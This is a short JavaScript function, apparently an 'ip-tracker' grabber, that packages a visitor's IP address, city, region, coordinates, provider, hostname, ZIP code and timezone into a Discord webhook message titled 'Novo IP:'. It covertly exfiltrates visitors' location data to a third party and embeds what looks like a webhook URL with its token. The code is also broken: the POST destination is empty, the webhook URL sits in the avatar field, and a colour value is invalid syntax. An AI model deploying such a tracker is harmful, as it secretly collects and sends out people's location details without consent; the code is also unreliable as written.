function collectInfo(json) {
  // Create a new XMLHttpRequest object
  var wbRequest = new XMLHttpRequest();

  // Set the destination URL for the webhook
  wbRequest.open("POST", "");

  // Set the content type for the request
  wbRequest.setRequestHeader('Content-type', 'application/json');

  // Set the payload for the webhook
  var params = {
    username: "ip-tracker",
    avatar_url: "https://discord.com/api/webhooks/1125245988093825144/QZUXFnlGiBBiYFXuaVH0MiWqxZqvvzgjRdBaUYrxYqu_xmBfYTdgfBguvzvI3ysedt6y",
    content: "DISCORD WEBHOOK MESSAGE CONTENT\n",
    embeds: [{
      title: "Novo IP:",
      color: #0000000,
      description: `**IP:** \`${json.ip}\`\n` +
                   `**Region:** \`${json.country}, ${json.region}, ${json.city}\`\n` +
                   `**Coords.:** \`${json.loc}\`\n\n` +
                   `**Provider:** \`${json.org}\`\n` +
                   `**Host:** \`${json.hostname}\`\n\n` +
                   `**ZIP Code:** \`${json.postal}\`\n` +
                   `**Timezone:** \`${json.timezone}\``
    }]
  };

  // Send the request with the payload as a JSON string
  wbRequest.send(JSON.stringify(params));
}
